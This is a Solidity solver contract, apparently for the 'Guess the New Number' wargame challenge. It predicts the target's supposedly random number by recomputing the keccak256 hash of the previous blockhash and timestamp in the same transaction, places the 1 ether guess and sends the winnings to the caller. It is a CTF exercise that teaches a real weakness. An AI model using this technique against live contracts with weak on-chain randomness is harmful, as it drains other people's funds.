// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract Solver {
    IGuessTheNewNumberChallenge private cont;

    constructor(address adr) {
        cont = IGuessTheNewNumberChallenge(adr);
    }

    function solve() public payable {
        require(msg.value == 1 ether, "send 1 ether first");

        bytes32 parentHash = blockhash(block.number - 1);

        uint8 number = uint8(
            uint256(keccak256(abi.encodePacked(parentHash, block.timestamp)))
        );

        cont.guess{value: 1 ether}(number);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
